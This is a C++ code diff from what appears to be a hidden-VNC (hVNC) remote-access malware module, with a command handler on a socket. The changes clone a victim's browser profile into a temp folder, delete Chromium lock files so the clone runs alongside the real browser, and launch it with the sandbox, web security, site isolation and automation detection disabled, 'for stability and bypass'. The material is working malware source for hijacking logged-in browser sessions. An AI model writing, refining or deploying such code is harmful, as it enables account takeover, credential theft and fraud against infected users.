@@ -1316,26 +1316,36 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 wstring cmdLineStr;
 
                 if (isBrowser) {
-                    send_status("Profiller kopyalanıyor...");
                     wstring tempBase = GetEnvVar(L"TEMP");
                     if (tempBase.empty()) tempBase = L"C:\\Windows\\Temp";
 
-                    wstring clonePath = tempBase + L"\\hvncp_" + bInfo.name + L"_" + to_wstring(GetTickCount());
+                    wstring clonePath = tempBase + L"\\hvncp_" + bInfo.name;
 
-                    // Fast Selective Copy
-                    CopyProfileEssential(bInfo.userData, clonePath);
+                    // Only clone if hVNC profile doesn't exist to speed up subsequent launches
+                    if (!PathFileExistsW(clonePath.c_str())) {
+                        send_status("Profiller kopyalanıyor...");
+                        CopyProfileEssential(bInfo.userData, clonePath);
+                    }
 
-                    // Chromium check for lock files to prevent "Already in Use" dialogs
+                    // Always cleanup locks to allow launching even if main browser is open
                     DeleteFileW((clonePath + L"\\SingletonLock").c_str());
                     DeleteFileW((clonePath + L"\\SingletonCookie").c_str());
                     DeleteFileW((clonePath + L"\\SingletonSocket").c_str());
 
                     send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
+
+                    // Common flags for stability and bypass
                     cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + clonePath +
                                  L"\" --no-sandbox --test-type --password-store=basic --disable-gpu --no-first-run "
                                  L"--no-default-browser-check --disable-blink-features=AutomationControlled "
                                  L"--allow-running-insecure-content --disable-web-security "
+                                 L"--disable-features=CalculateNativeWinOcclusion,IsolateOrigins,site-per-process "
                                  L"--disable-infobars --remote-debugging-port=0";
+
+                    // Brave specific GUI fix
+                    if (requestedPath == "brave.exe") {
+                        cmdLineStr += L" --disable-brave-update --disable-brave-rewards --disable-software-rasterizer --disable-gpu-sandbox --disable-gpu-compositing";
+                    }
                 } else {
                     cmdLineStr = path;
                 }
